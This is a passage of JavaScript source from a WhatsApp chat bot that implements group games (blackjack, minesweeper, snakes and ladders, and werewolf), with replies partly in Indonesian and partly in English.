        const dealerCards = dealer.cards.map(card => `${card.name}`).join(', ');
        const dealerTotal = dealer.total;
        const playerCards = player.cards.map(card => `${card.name}`).join(', ');
        const playerTotal = player.total;

        let hiddenDealerCards = dealer.cards.slice(0, -1).map(card => `${card.name}`).join(', ');
        if (dealer.cards.length > 1) {
            hiddenDealerCards += ', ❓';
        } else {
            hiddenDealerCards += `, ${dealer.cards[0].name}`;
        }
        
        switch (state) {
            case "player_win":
            case "dealer_win":
            case "draw":
            case "player_blackjack":
            case "dealer_blackjack":
                hiddenDealerCards = dealer.cards.map(card => `${card.name}`).join(', ');
                message = `*\`🃏 • B L A C K J A C K •\`*

╭───┈ •
│ *Your Cards:*\n│ \`${playerCards}\`
│ *Your Total:*\n│ \`${playerTotal}\`
├───┈ •
│ *Dealer's Cards:*\n│ \`${dealerCards}\`
│ *Dealer's Total:*\n│ \`${dealerTotal > 21 ? 'BUST' : dealerTotal}\`
╰───┈ •

> *\`${(state === "player_win" ? "You win! 🎉" : state === "dealer_win" ? "Dealer wins. 😔" : state === "draw" ? "Draw. 🤝" : state === "player_blackjack" ? "Blackjack! 🥳" : "Dealer got Blackjack! 😔").toUpperCase()}\`*\n*Bet:*\n- \`\`\`${formatter.format(bet)}\`\`\`\n*Payout:*\n- \`\`\`${formatter.format(payout)}\`\`\`
`;
                global.db.data.users[PhistarBotInc.blackjack[m.chat].idPemain];
                delete PhistarBotInc.blackjack[m.chat];
                break;
            default:
                message = `*\`🃏 • B L A C K J A C K •\`*

╭───┈ •
│ *Your Cards:*\n│ \`${playerCards}\`
│ *Your Total:*\n│ \`${playerTotal}\`
├───┈ •
│ *Dealer's Cards:*\n│ \`${hiddenDealerCards}\`
│ *Dealer's Total:*\n│ \`${dealerTotal > 21 ? 'BUST' : '❓'}\`
╰───┈ •

*Bet:*\n- \`\`\`${formatter.format(bet)}\`\`\`

Type *\`${prefix + command} hit\`* to draw a card.
Type *\`${prefix + command} stand\`* to end your turn.`;
                break;
        }
        return message;
    };

    PhistarBotInc.blackjack = PhistarBotInc.blackjack || {};
    let aksi = args[0];
    let argumen = args[1];

    try {
        switch (aksi) {
            case 'end':
                if (PhistarBotInc.blackjack[m.chat]?.idPemain === m.sender) {
                    delete PhistarBotInc.blackjack[m.chat];
                    await replyphistar('*Anda keluar dari sesi blackjack.* 👋');
                } else {
                    await replyphistar('*Tidak ada sesi blackjack yang sedang berlangsung atau Anda bukan pemainnya.*');
                }
                break;

            case 'start':
                if (PhistarBotInc.blackjack[m.chat]) {
                    await replyphistar(`*A blackjack session is already in progress.* Use *${prefix + command} end* to exit the session.`);
                } else {
                    PhistarBotInc.blackjack[m.chat] = new Blackjack(1);
                    PhistarBotInc.blackjack[m.chat].idPemain = m.sender;
                    let betAmount = argumen ? parseInt(argumen) : 1000;
                    PhistarBotInc.blackjack[m.chat].placeBet(betAmount);
                    PhistarBotInc.blackjack[m.chat].start();
                    const table = PhistarBotInc.blackjack[m.chat];
                    const pesanStart = templateBlackjackMessage(prefix, command, PhistarBotInc, m, table);
                    await replyphistar(pesanStart);
                }
                break;

            case 'hit':
                if (!PhistarBotInc.blackjack[m.chat] || PhistarBotInc.blackjack[m.chat]?.idPemain !== m.sender) {
                    await replyphistar('*You are not playing blackjack or you are not a player*');
                    break;
                }
                PhistarBotInc.blackjack[m.chat].hit();
                const tableHit = PhistarBotInc.blackjack[m.chat];
                const pesanHit = templateBlackjackMessage(prefix, command, PhistarBotInc, m, tableHit);
                await replyphistar(pesanHit);
                break;

            case 'stand':
                if (!PhistarBotInc.blackjack[m.chat] || PhistarBotInc.blackjack[m.chat]?.idPemain !== m.sender) {
                    await replyphistar('*You are not playing blackjack or you are not a player.*');
                    break;
                }
                PhistarBotInc.blackjack[m.chat].stand();
                const tableStand = PhistarBotInc.blackjack[m.chat];
                const pesanStand = templateBlackjackMessage(prefix, command, PhistarBotInc, m, tableStand);
                await replyphistar(pesanStand);
                break;

            case 'double':
                if (!PhistarBotInc.blackjack[m.chat] || PhistarBotInc.blackjack[m.chat]?.idPemain !== m.sender) {
                    await replyphistar('*You are not playing blackjack or you are not a player.*');
                    break;
                }
                PhistarBotInc.blackjack[m.chat].doubleDown();
                const tableDouble = PhistarBotInc.blackjack[m.chat];
                const pesanDouble = templateBlackjackMessage(prefix, command, PhistarBotInc, m, tableDouble);
                await replyphistar(pesanDouble);
                break;

            default:
                await replyphistar(`*Invalid command.*\nUse *${prefix + command} start* to start a blackjack session.`);
                break;
        }
    } catch (err) {
        console.error(err);
        await replyphistar('*An error occurred while processing the command.*');
    }
}
break;
case 'msp': {
    const generate = (x, y, bombs) => {
        const field = Array.from({
            length: x
        }, () => Array(y).fill(0));

        for (let i = 0; i < bombs; i++) {
            let xBomb, yBomb;
            do {
                xBomb = Math.floor(Math.random() * x);
                yBomb = Math.floor(Math.random() * y);
            } while (field[xBomb][yBomb] === 'x');

            field[xBomb][yBomb] = 'x';
        }

        for (let i = 0; i < x; i++) {
            for (let j = 0; j < y; j++) {
                if (field[i][j] !== 'x') {
                    for (let k = -1; k <= 1; k++) {
                        for (let l = -1; l <= 1; l++) {
                            const ni = i + k;
                            const nj = j + l;
                            if (ni >= 0 && ni < x && nj >= 0 && nj < y && field[ni][nj] === 'x') {
                                field[i][j]++;
                            }
                        }
                    }
                }
            }
        }

        return field;
    };

    const generateEmpty = (x, y) => Array.from({
        length: x
    }, () => Array(y).fill(0));

    const translate = (value) => {
        switch (value) {
            case 0:
                return '⬜';
            case 1:
                return '1️⃣';
            case 2:
                return '2️⃣';
            case 3:
                return '3️⃣';
            case 4:
                return '4️⃣';
            case 5:
                return '5️⃣';
            case 6:
                return '6️⃣';
            case 7:
                return '7️⃣';
            case 8:
                return '8️⃣';
            case 'x':
                return '💣';
            case 'e':
                return '⏹️';
            case 'f':
                return '🚩';
        }
    };

    const generateString = (map) => map.map(row => row.map(cell => translate(cell)).join('')).join('\n');

    const detectZero = (map, x, y) => {
        const queue = [
            [x, y]
        ];
        const result = [];
        const visited = new Set();

        while (queue.length > 0) {
            const [cx, cy] = queue.shift();
            if (!visited.has(`${cx},${cy}`)) {
                visited.add(`${cx},${cy}`);
                result.push([cx, cy]);

                if (map[cx][cy] === 0) {
                    for (let i = -1; i <= 1; i++) {
                        for (let j = -1; j <= 1; j++) {
                            const ni = cx + i;
                            const nj = cy + j;
                            if (ni >= 0 && ni < map.length && nj >= 0 && nj < map[0].length) {
                                queue.push([ni, nj]);
                            }
                        }
                    }
                }
            }
        }

        return result;
    };

    PhistarBotInc.minessweeper = PhistarBotInc.minessweeper || {};
    const orgs = args[0];
    const oX = args[1];
    const oY = args[2];
    const F = args[3];
    const x = 10;
    const y = 10;
    const bombs = 15;

    if (!orgs) {
        return replyphistar(`🕹️ *Minesweeper Game* 🕹️\n*▶️ ${prefix + command} go* - Start the Game\n*🔓 ${prefix + command} open* - Open a cell\n*🔽 ${prefix + command} surrender* - Surrender\n\n*Example:* ${prefix + command} go`);
    }

    switch (orgs.toLowerCase()) {
        case "go":
        case "start":
            const map = generate(x, y, bombs);
            const empty = generateEmpty(x, y);
            const {
                key
            } = await replyphistar('🕹️ *Minesweeper Game* 🕹️\n\n*Board*\n' + generateString(empty));
            PhistarBotInc.minessweeper[m.chat] = {
                'map': map,
                'current': empty,
                'key': key
            };
            return;

        case "surrender":
        case "stop":
        case "end":
            if (!PhistarBotInc.minessweeper[m.chat]) {
                return replyphistar('🚨 *No active game session.*');
            }
            delete PhistarBotInc.minessweeper[m.chat];
            return replyphistar('🏳️ *You surrendered.*');

        case "open":
        case "o":
        case "buka":
            if (!PhistarBotInc.minessweeper[m.chat]) {
                return replyphistar('🚨 *No active game session.*');
            }
            if (oX > 10 || !oX || !oY) {
                return replyphistar(`🚨 *Invalid parameters. Example: ${prefix + command} open 2 5*`);
            }

            const g = PhistarBotInc.minessweeper[m.chat];

            if (F === 'f') {
                g.current[oY - 1][oX - 1] = '🚩';
            } else {
                const openedCell = g.map[oX - 1][oY - 1];

                if (openedCell === 0) {
                    const zero = detectZero(g.map, oX - 1, oY - 1);
                    for (const coords of zero) {
                        g.current[coords[0]][coords[1]] = g.map[coords[0]][coords[1]];
                    }
                } else if (openedCell === 'x') {
                    delete PhistarBotInc.minessweeper[m.chat];
                    const {
                        key: loseKey
                    } = await replyphistar('💥 *BOOM!* 💣 *You opened a bomb.*');
                    PhistarBotInc.minessweeper[m.chat] = {
                        'key': loseKey
                    };
                    return;
                } else {
                    g.current[oY - 1][oX - 1] = openedCell;
                }
            }

            await PhistarBotInc.sendMessage(m.chat, {
                delete: g.key
            });

            const {
                key: newKey
            } = await replyphistar('🕹️ *Minesweeper Game* 🕹️\n\n*Board*\n' + generateString(g.current));
            PhistarBotInc.minessweeper[m.chat].key = newKey;
            return;
    }
}
break;

case 'ulartangga': {
    class SnakeAndLadderGame {
        constructor(sMsg) {
            this.sendMsg = sMsg;
            this.players = [];
            this.boardSize = 100;
            this.snakesAndLadders = [{
                    start: 29,
                    end: 7
                }, {
                    start: 24,
                    end: 12
                }, {
                    start: 15,
                    end: 37
                },
                {
                    start: 23,
                    end: 41
                }, {
                    start: 72,
                    end: 36
                }, {
                    start: 49,
                    end: 86
                },
                {
                    start: 90,
                    end: 56
                }, {
                    start: 75,
                    end: 64
                }, {
                    start: 74,
                    end: 95
                },
                {
                    start: 91,
                    end: 72
                }, {
                    start: 97,
                    end: 78
                }
            ];
            this.currentPositions = {};
            this.currentPlayerIndex = 0;
            this.bgImageUrl = 'https://i.pinimg.com/originals/2f/68/a7/2f68a7e1eee18556b055418f7305b3c0.jpg';
            this.playerImageUrls = {
                red: 'https://telegra.ph/file/86fd8ea9311e2bc99ae63.jpg',
                green: 'https://dkonten.com/studio/wp-content/uploads/sites/19/2023/05/search-1.png'
            };
            this.bgImage = null;
            this.playerImages = {
                red: null,
                green: null
            };
            this.cellWidth = 40;
            this.cellHeight = 40;
            this.keyId = null;
            this.started = false;
        }

        initializeGame() {
            this.players.forEach(player => (this.currentPositions[player] = 1));
            this.currentPlayerIndex = 0;
            this.started = true;
        }

        rollDice = (num) => {
            return Array.from({ length: num }, () => Math.floor(Math.random() * 6) + 1)[Math.floor(Math.random() * num)];
        };

        fetchImage = async (url) => {
            try {
                const response = await axios.get(url, {
                    responseType: 'arraybuffer'
                });
                return await Jimp.read(Buffer.from(response.data, 'binary'));
            } catch (error) {
                console.error(`Error fetching image from ${url}:`, error);
                throw error;
            }
        };

        getBoardBuffer = async () => {
            const board = new Jimp(420, 420);
            this.bgImage.resize(420, 420);
            board.composite(this.bgImage, 0, 0);

            for (const player of this.players) {
                const {
                    x,
                    y
                } = this.calculatePlayerPosition(player);
                board.composite(await this.getPlayerImage(player), x, y);
            }

            return board.getBufferAsync(Jimp.MIME_PNG);
        };

        calculatePlayerPosition = (player) => {
            const playerPosition = this.currentPositions[player];
            const row = 9 - Math.floor((playerPosition - 1) / 10);
            const col = (playerPosition - 1) % 10;
            const x = col * this.cellWidth + 10;
            const y = row * this.cellHeight + 10;
            return {
                x,
                y
            };
        };

        getPlayerImage = async (player) => {
            const color = this.getPlayerColor(player);

            if (!this.playerImages[color]) {
                try {
                    const image = await this.fetchImage(this.playerImageUrls[color]);
                    this.playerImages[color] = image;
                } catch (error) {
                    console.error(`Error fetching image for ${color} player:`, error);
                    throw error;
                }
            }

            return this.playerImages[color].clone().resize(this.cellWidth, this.cellHeight);
        };

        getPlayerColor = (player) => (player === this.players[0] ? 'red' : 'green');

        startGame = async (m, player1Name, player2Name) => {
            await replyphistar(`🐍🎲 *Selamat datang di Permainan Ular Tangga!* 🎲🐍 \n\n${this.formatPlayerName(player1Name)} *vs* ${this.formatPlayerName(player2Name)}`);

            this.players = [player1Name, player2Name];
            await this.initializeGame();

            if (!this.bgImage) this.bgImage = await this.fetchImage(this.bgImageUrl);

            const {
                key
            } = await PhistarBotInc.sendMessage(m.chat, { image: await this.getBoardBuffer() });
            this.keyId = key;
        };

        formatPlayerName = (player) => {
            const color = this.getPlayerColor(player);
            return `@${player.split('@')[0]} ( ${color.charAt(0).toUpperCase() + color.slice(1)} )`;
        };

        playTurn = async (m, player) => {
            if (!this.players.length) return replyphistar('🛑 *There are no active games.*\nUse "!snake start" to start a new game..');
            if (player !== this.players[this.currentPlayerIndex]) return replyphistar(`🕒 *It's not your turn.* \n\nNow it's your turn ${this.formatPlayerName(this.players[this.currentPlayerIndex])}`);

            const diceRoll = this.rollDice(6);
            await PhistarBotInc.sendMessage(m.chat, { image: { url: "https://i.pinimg.com/originals/2f/68/a7/2f68a7e1eee18556b055418f7305b3c0.jpg" }, caption: `🎲 ${this.formatPlayerName(player)} *roll the dice.*\n\n - Dice: *${diceRoll}*\n - From box: *${this.currentPositions[player]}*\n - To box: *${this.currentPositions[player] + diceRoll}*` }, { quoted: m });

            if (this.players.length === 0) return;

            const currentPosition = this.currentPositions[player];
            let newPosition = currentPosition + diceRoll;

            for (const otherPlayer of this.players) {
                if (otherPlayer !== player && this.currentPositions[otherPlayer] === newPosition) {
                    const message = `😱 *Oh no!* ${this.formatPlayerName(player)} *steps into position* ${this.formatPlayerName(otherPlayer)}\n*Back to beginning of cell..*`;
                    await replyphistar(message);
                    newPosition = 1;
                }
            }

            if (newPosition <= this.boardSize) {
                const checkSnakeOrLadder = this.snakesAndLadders.find((s) => s.start === this.currentPositions[player]);

                if (checkSnakeOrLadder) {
                    const action = checkSnakeOrLadder.end < checkSnakeOrLadder.start ? 'Back' : 'Forward';
                    await replyphistar(`🐍 ${this.formatPlayerName(player)} find *${action === 'Back' ? 'snake' : 'ladder'}!*\n*${action}* to box *${checkSnakeOrLadder.end}*`);
                    this.currentPositions[player] = checkSnakeOrLadder.end;
                } else {
                    this.currentPositions[player] = newPosition;
                }

                if (this.currentPositions[player] === this.boardSize) {
                    await replyphistar(`🎉 ${this.formatPlayerName(player)} win!\n*Congratulations!*`);
                    await this.resetSession();
                    return;
                }

                if (diceRoll !== 6) {
                    this.currentPlayerIndex = 1 - this.currentPlayerIndex;
                } else {
                    await replyphistar('🎲 *You got 6*\nSo your turn still continues.');
                }
            } else {
                await replyphistar('🔄 Exceeding the box limit, the position is reset and the turn goes to the next player..');
                this.currentPositions[player] = 1;
                this.currentPlayerIndex = 1 - this.currentPlayerIndex;
            }

            const boardBuffer = await this.getBoardBuffer();
            const sendMsg = this.sendMsg;
            await sendMsg.sendMessage(m.chat, {
                delete: this.keyId
            });

            const {
                key
            } = await replyphistar(boardBuffer);
            this.keyId = key;
        };

        addPlayer = (player) => this.players.length < 2 && !this.players.includes(player) && player !== '' && (this.players.push(player), true);

        resetSession = () => {
            this.players = [];
            this.currentPositions = {};
            this.currentPlayerIndex = 0;
            this.started = false;
        };

        isGameStarted = () => this.started;
    }

    PhistarBotInc.ulartangga = PhistarBotInc.ulartangga || {};
    const sessions = (PhistarBotInc.ulartangga_ = PhistarBotInc.ulartangga_ || {});
    const sessionId = m.chat;
    const session = sessions[sessionId] || (sessions[sessionId] = new GameSession(sessionId, PhistarBotInc));
    const game = session.game;
    const {
        state
    } = PhistarBotInc.ulartangga[m.chat] || {
        state: false
    };

    switch (args[0]) {
        case 'join':
            if (state) return replyphistar('🛑 *The game has started.*\nCannot join.');
            const playerName = m.sender;
            const joinSuccess = game.addPlayer(playerName);
            joinSuccess ? replyphistar(`👋 ${game.formatPlayerName(playerName)} *join the game..*`) : replyphistar('*You have already joined or the game is full.*\nCannot join.');
            break;

        case 'start':
            if (state) return replyphistar('🛑 *The game has started.*\nCannot restart.');
            PhistarBotInc.ulartangga[m.chat] = {
                ...PhistarBotInc.ulartangga[m.chat],
                state: true
            };
            if (game.players.length === 2) {
                await game.startGame(m, game.players[0], game.players[1]);
                await replyphistar('🛑 *The game has started.*\nCannot restart..');
                return;
            } else {
                await replyphistar('👥 *There are not enough players to start the game.*\nA minimum of 2 players is required..');
                return;
            }
            break;

        case 'roll':
            if (!state) return replyphistar(`🛑 *The game has not started yet.*\nType *${prefix + command} start* to start`);
            if (game.isGameStarted()) {
                const currentPlayer = game.players[game.currentPlayerIndex];
                if (m.sender !== currentPlayer) {
                    await replyphistar(`🕒 *It's not your turn.* \n\nNow it's your turn ${game.formatPlayerName(currentPlayer)}`);
                    return;
                } else {
                    await game.playTurn(m, currentPlayer);
                    return;
                }
            } else {
                await replyphistar(`🛑 *The game has not started yet.*\nType *${prefix + command} start* to start.`);
                return;
            }
            break;

        case 'reset':
            PhistarBotInc.ulartangga[m.chat] = {
                ...PhistarBotInc.ulartangga[m.chat],
                state: false
            };
            session.game.resetSession();
            delete sessions[sessionId];
            await replyphistar('🔄 *Game session reset*');
            break;

        case 'help':
            await replyphistar(`🎲🐍 *Snakes and Ladders Game* 🐍🎲\n\n*Commands:*\n- *${prefix + command} join :* Join the game.\n- *${prefix + command} start :* Start the game.\n- *${prefix + command} roll :* Roll the dice to move.\n- *${prefix + command} reset :* Reset the game session.`);
            break;

        default:
            replyphistar(`❓ *Perintah tidak valid.*\nGunakan *${prefix + command} help* untuk melihat daftar perintah.`);
    }
}
break;


case 'wwpc':
case 'ww':
case 'werewolf': {
    let jimp = require("jimp");
    const resize = async (image, width, height) => {
        const read = await jimp.read(image);
        const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
        return data;
    };

    let {
        emoji_role,
        sesi,
        playerOnGame,
        playerOnRoom,
        playerExit,
        dataPlayer,
        dataPlayerById,
        getPlayerById,
        getPlayerById2,
        killWerewolf,
        killww,
        dreamySeer,
        sorcerer,
        protectGuardian,
        roleShuffle,
        roleChanger,
        roleAmount,
        roleGenerator,
        addTimer,
        startGame,
        playerHidup,
        playerMati,
        vote,
        voteResult,
        clearAllVote,
        getWinner,
        win,
        pagi,
        malam,
        skill,
        voteStart,
        voteDone,
        voting,
        run,
        run_vote,
        run_malam,
        runprefixagi
    } = require('./lib/werewolf.js');

    // [ Thumbnail ] 
    let thumb = "https://user-images.githubusercontent.com/72728486/235316834-f9f84ba0-8df3-4444-81d8-db5270995e6d.jpg";

    const {
        sender,
        chat
    } = m;
    PhistarBotInc.werewolf = PhistarBotInc.werewolf ? PhistarBotInc.werewolf : {};
    const ww = PhistarBotInc.werewolf ? PhistarBotInc.werewolf : {};
    const data = ww[chat];
    const value = args[0];
    const target = args[1];
    let byId = getPlayerById2(sender, parseInt(target), ww);

    // [ Membuat Room ]
    if (value === "create") {
        if (chat in ww) return replyphistar("Group is still in game session");
        if (playerOnGame(sender, ww) === true)
            return replyphistar("Kamu masih dalam sesi game");
        ww[chat] = {
            room: chat,
            owner: sender,
            status: false,
            iswin: null,
            cooldown: null,
            day: 0,
            time: "malem",
            player: [],
            dead: [],
            voting: false,
            seer: false,
            guardian: [],
        };
        await replyphistar("Room successfully created, type *.ww join* to join");

    // [ Join sesi permainan ]
    } else if (value === "join") {
        if (!ww[chat]) return replyphistar("No game sessions yet");
        if (ww[chat].status === true)
            return replyphistar("The game session has started");
        if (ww[chat].player.length > 16)
            return replyphistar("Maaf jumlah player telah penuh");
        if (playerOnRoom(sender, chat, ww) === true)
            return replyphistar("Sorry, the number of players is full.");
        if (playerOnGame(sender, ww) === true)
            return replyphistar("You are still in a game session.");
        let data = {
            id: sender,
            number: ww[chat].player.length + 1,
            sesi: chat,
            status: false,
            role: false,
            effect: [],
            vote: 0,
            isdead: false,
            isvote: false,
        };
        ww[chat].player.push(data);
        let player = [];
        let text = `\n*⌂ W E R E W O L F - P L A Y E R*\n\n`;
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace("@s.whatsapp.net", "")}\n`;
            player.push(ww[chat].player[i].id);
        }
        text += "\nThe minimum number of players is 5 and the maximum is 15.";
        PhistarBotInc.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );

    // [ Game Play ]
    } else if (value === "start") {
        if (!ww[chat]) return replyphistar("No game sessions yet");
        if (ww[chat].player.length === 0)
            return replyphistar("Room belum memiliki player");
        if (ww[chat].player.length < 5)
            return replyphistar("Maaf jumlah player belum memenuhi syarat");
        if (playerOnRoom(sender, chat, ww) === false)
            return replyphistar("Room has no players yet");
        if (ww[chat].cooldown > 0) {
            if (ww[chat].time === "voting") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_vote(PhistarBotInc, chat, ww);
            } else if (ww[chat].time === "malem") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_malam(PhistarBotInc, chat, ww);
            } else if (ww[chat].time === "evening") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await runprefixagi(PhistarBotInc, chat, ww);
            }
        }
        if (ww[chat].status === true)
            return replyphistar("The game session has started");
        if (ww[chat].owner !== sender)
            return replyphistar(
                `Only @${ww[chat].owner.split("@")[0]} can start a game.`
            );
        let list1 = "";
        let list2 = "";
        let player = [];
        roleGenerator(chat, ww);
        addTimer(chat, ww);
        startGame(chat, ww);
        for (let i = 0; i < ww[chat].player.length; i++) {
            list1 += `(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace("@s.whatsapp.net", "")}\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            list2 += `(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace("@s.whatsapp.net", "")} ${ww[chat].player[i].role === "werewolf" || ww[chat].player[i].role === "sorcerer" ? `[${ww[chat].player[i].role}]` : ""}\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            // [ Werewolf ]
            if (ww[chat].player[i].role === "werewolf") {
                if (ww[chat].player[i].isdead != true) {
                    var textt = `Hi ${PhistarBotInc.getName(ww[chat].player[i].id)}, You have been chosen to play the role of *Werewolf* ${emoji_role("werewolf")} in this game, please choose one of the players you want to eat tonight\n*LIST PLAYER*:\n${list2}\n\nType *.wwpc kill number* to kill the player`;
                    await PhistarBotInc.sendMessage(ww[chat].player[i].id, {
                        text: textt,
                        mentions: player,
                    });
                }
            // [ villager ]
            } else if (ww[chat].player[i].role === "warga") {
                if (ww[chat].player[i].isdead != true) {
                    let texttt = `*⌂ W E R E W O L F - G A M E*\n\nHi ${PhistarBotInc.getName(ww[chat].player[i].id)} Your role is *Villager* ${emoji_role("resident")}, stay alert, maybe *Werewolf* will eat you tonight, please go to your respective houses.\n*LIST PLAYER*:\n${list1}`;
                    await PhistarBotInc.sendMessage(ww[chat].player[i].id, {
                        text: texttt,
                        mentions: player,
                    });
                }
            // [ Penerawangan ]
            } else if (ww[chat].player[i].role === "seer") {
                if (ww[chat].player[i].isdead != true) {
                    let texxt = `Hi ${PhistarBotInc.getName(ww[chat].player[i].id)} You have been chosen to be the *clairvoyant* ${emoji_role("seer")}. With the magic you have, you can find out the role of your chosen player.\n*LIST PLAYER*:\n${list1}\n\nType *.wwpc dreamy number* to see the role player`;
                    await PhistarBotInc.sendMessage(ww[chat].player[i].id, {
                        text: texxt,
                        mentions: player,
                    });
                }
            // [ Guardian ]
            } else if (ww[chat].player[i].role === "guardian") {
                if (ww[chat].player[i].isdead != true) {
                    let teext = `Hi ${PhistarBotInc.getName(ww[chat].player[i].id)} You have been chosen to play the role of *Guardian Angel* ${emoji_role("guardian")}, with the power you have, you can protect the citizens, please choose 1 player you want to protect\n*LIST PLAYER*:\n${list1}\n\nType *.wwpc deff number* to protect the player`;
                    await PhistarBotInc.sendMessage(ww[chat].player[i].id, {
                        text: teext,
                        mentions: player,
                    });
                }
            // [ Sorcerer ]
            } else if (ww[chat].player[i].role === "sorcerer") {
                if (ww[chat].player[i].isdead != true) {
                    let textu = `Hi ${PhistarBotInc.getName(ww[chat].player[i].id)} You are chosen as the Sorcerer ${emoji_role("sorcerer")}, with the power you have, you can reveal the identities of the players, please select 1 person whose identity you want to reveal\n*LIST PLAYER*:\n${list2}\n\nType *.wwpc sorcerer number* to see the player role`;
                    await PhistarBotInc.sendMessage(ww[chat].player[i].id, {
                        text: textu,
                        mentions: player,
                    });
                }
            }
        }
        await PhistarBotInc.sendMessage(m.chat, {
            text: "*⌂ W E R E W O L F - G A M E*\n\nThe game has started, players will play their respective roles, please check your private chat to see your role. Be careful citizens, maybe tonight is your last night",
            contextInfo: {
                externalAdReply: {
                    title: "W E R E W O L F",
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    thumbnail: await resize(thumb, 300, 175),
                    sourceUrl: "",
                    mediaUrl: thumb,
                },
                mentionedJid: player,
            },
        });
        await run(PhistarBotInc, chat, ww);
    } else if (value === "kill") {
        let byId = getPlayerById2(sender, parseInt(target), ww);
        if (dataPlayer(sender, ww).role !== "werewolf")
            return replyphistar("This role is not for you");
        if (byId.db.role === "sorcerer")
            return replyphistar("Cannot use skill for friend");
        if (playerOnGame(sender, ww) === false)
            return replyphistar("You are not in a game session");
        if (dataPlayer(sender, ww).status === true)
            return replyphistar("Skill has been used, skill can only be used once per night");
        if (dataPlayer(sender, ww).isdead === true)
            return replyphistar("You are dead");
        if (!target || target.length < 1 || target.split('').length > 2)
            return replyphistar(`Enter player number \nExample: \n${prefix + command} kill 1`);
        if (isNaN(target))
            return replyphistar("Use only numbers");
        if (byId.db.isdead === true)
            return replyphistar("Player is dead");
        if (byId.db.id === sender)
            return replyphistar("Cannot use skills for yourself");
        if (byId === false)
            return replyphistar("Player not registered");
        replyphistar("Successfully killed player " + parseInt(target))
            .then(() => {
                dataPlayer(sender, ww).status = true;
                killWerewolf(sender, parseInt(target), ww);
            });
    } else if (value === "dreamy") {
        if (dataPlayer(sender, ww).role !== "seer")
            return replyphistar("This role is not for you");
        if (playerOnGame(sender, ww) === false)
            return replyphistar("You are not in a game session");
        if (dataPlayer(sender, ww).status === true)
            return replyphistar("Skill has been used, skill can only be used once per night");
        if (dataPlayer(sender, ww).isdead === true)
            return replyphistar("You are dead");
        if (!target || target.length < 1 || target.split('').length > 2)
            return replyphistar(`Enter player number \nExample: \n${prefix + command} kill 1`);
        if (isNaN(target))
            return replyphistar("Use only numbers");
        let byId = getPlayerById2(sender, parseInt(target), ww);
        if (byId.db.isdead === true)
            return replyphistar("Player is dead");
        if (byId.db.id === sender)
            return replyphistar("Cannot use skills for yourself");
        if (byId === false)
            return replyphistar("Player is not registered");
        let dreamy = dreamySeer(m.sender, parseInt(target), ww);
        replyphistar(`Successfully opened the identity of player ${target} is ${dreamy}`)
            .then(() => {
                dataPlayer(sender, ww).status = true;
            });
    } else if (value === "deff") {
        if (dataPlayer(sender, ww).role !== "guardian")
            return replyphistar("This role is not for you");
        if (playerOnGame(sender, ww) === false)
            return replyphistar("You are not in a game session");
        if (dataPlayer(sender, ww).status === true)
            return replyphistar("Skill has been used, skill can only be used once per night");
        if (dataPlayer(sender, ww).isdead === true)
            return replyphistar("You are dead");
        if (!target || target.length < 1 || target.split('').length > 2)
            return replyphistar(`Enter player number \nExample: \n${prefix + command} kill 1`);
        if (isNaN(target))
            return replyphistar("Use only numbers");
        let byId = getPlayerById2(sender, parseInt(target), ww);
        if (byId.db.isdead === true)
            return replyphistar("Player is dead");
        if (byId.db.id === sender)
            return replyphistar("Cannot use skill for self");
        if (byId === false)
            return replyphistar("Player is not registered");
        replyphistar(`Successfully protected player ${target}`).then(() => {
            protectGuardian(m.sender, parseInt(target), ww);
            dataPlayer(sender, ww).status = true;
        });
    } else if (value === "sorcerer") {
        if (dataPlayer(sender, ww).role !== "sorcerer")
            return replyphistar("This role is not for you");
        if (playerOnGame(sender, ww) === false)
            return replyphistar("You are not in a game session");
        if (dataPlayer(sender, ww).status === true)
            return replyphistar("Skill has been used, skill can only be used once per night");
        if (dataPlayer(sender, ww).isdead === true)
            return replyphistar("You are dead");
        if (!target || target.length < 1 || target.split('').length > 2)
            return replyphistar(`Enter player number \nExample: \n${prefix + command} kill 1`);
        if (isNaN(target))
            return replyphistar("Use only numbers");
        let byId = getPlayerById2(sender, parseInt(target), ww);
        if (byId.db.isdead === true)
            return replyphistar("Player is dead");
        if (byId.db.id === sender)
            return replyphistar("Cannot use skill for self");
        if (byId === false)
            return replyphistar("Player is not registered");
        let sorker = sorcerer(m.sender, parseInt(target), ww);
        replyphistar(`Successfully opened the identity of player ${target} is ${sorker}`)
            .then(() => {
                dataPlayer(sender, ww).status = true;
            });
    } else if (value === "vote") {
        if (!ww[chat]) return replyphistar("There is no game session yet");
        if (ww[chat].status === false)
            return replyphistar("Game session has not started");
        if (ww[chat].time !== "voting")
            return replyphistar("Voting session has not started");
        if (playerOnRoom(sender, chat, ww) === false)
            return replyphistar("You are not a player");
        if (dataPlayer(sender, ww).isdead === true)
            return replyphistar("You are dead");
        if (!target || target.length < 1)
            return replyphistar("Enter player number");
        if (isNaN(target)) return replyphistar("Use only number");
        if (dataPlayer(sender, ww).isvote === true)
            return replyphistar("You have voted");
        let b = getPlayerById(chat, sender, parseInt(target), ww);
        if (b.db.isdead === true)
            return replyphistar(`Player ${target} is dead.`);
        if (ww[chat].player.length < parseInt(target))
            return replyphistar("Invalid");
        if (getPlayerById(chat, sender, parseInt(target), ww) === false)
            return replyphistar("Player is not registered!");
        vote(chat, parseInt(target), sender, ww);
        return replyphistar("✅ Vote");
    } else if (value === "exit") {
        if (!ww[chat]) return replyphistar("No game session");
        if (playerOnRoom(sender, chat, ww) === false)
            return replyphistar("You are not in a game session");
        if (ww[chat].status === true)
            return replyphistar("The game has started, you can't leave");
        let exitww = `${sender.split("@")[0]} Exit the game`;
        PhistarBotInc.sendMessage(
